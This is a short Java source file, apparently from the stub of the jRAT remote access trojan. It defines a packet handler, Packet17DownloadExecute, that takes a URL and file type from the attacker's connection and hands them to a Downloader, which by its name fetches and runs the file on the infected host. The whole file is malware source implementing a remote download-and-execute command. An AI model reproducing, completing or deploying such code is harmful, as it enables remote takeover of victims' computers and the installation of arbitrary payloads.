package se.jrat.stub.packets.incoming;

import se.jrat.stub.Connection;
import se.jrat.stub.Downloader;

public class Packet17DownloadExecute extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		String url = con.readLine();
		String type = con.readLine();
		boolean readFromSocket = con.readBoolean();

		new Downloader(con, url, false, type, readFromSocket).start();
	}

}